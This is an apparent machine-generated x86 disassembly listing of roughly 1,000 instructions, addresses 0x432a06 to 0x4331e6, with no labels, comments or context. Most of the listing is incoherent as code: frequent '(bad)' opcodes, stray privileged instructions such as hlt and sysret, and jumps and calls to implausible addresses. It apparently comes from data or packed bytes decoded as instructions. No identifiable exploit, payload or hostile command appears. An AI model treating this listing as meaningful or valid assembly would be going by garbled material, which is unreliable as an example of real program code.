  432a06:	or     BYTE PTR [ebp+0x7],cl
  432a09:	lea    ebx,[ebx-0x748dcdff]
  432a0f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a16:	mov    edx,DWORD PTR [eax]
  432a18:	cld    
  432a19:	dec    ebp
  432a1a:	push   esp
  432a1b:	sub    edx,DWORD PTR [ecx-0x75]
  432a1e:	add    eax,0xf172fc
  432a23:	or     BYTE PTR [ebp+0x7],cl
  432a26:	add    eax,ecx
  432a28:	or     al,0x72
  432a2a:	add    DWORD PTR [eax],eax
  432a2c:	mov    ebx,0x29c2c1
  432a31:	inc    ebp
  432a32:	mov    eax,DWORD PTR [ebx]
  432a34:	cmp    eax,0x3004d1c
  432a3a:	xbegin 0x66c8b634
  432a40:	clc    
  432a41:	or     BYTE PTR [ebp+0x45],al
  432a44:	xor    dh,BYTE PTR ds:0x78b089c
  432a4a:	adc    BYTE PTR [ebp+0x45],cl
  432a4d:	lea    eax,[ebp+0x33727501]
  432a53:	add    cl,ch
  432a55:	inc    ebp
  432a56:	add    bl,ch
  432a58:	add    BYTE PTR [ebx+0x45850845],cl
  432a5e:	je     0x4329eb
  432a60:	push   ebx
  432a61:	or     al,0x85
  432a63:	dec    ebp
  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
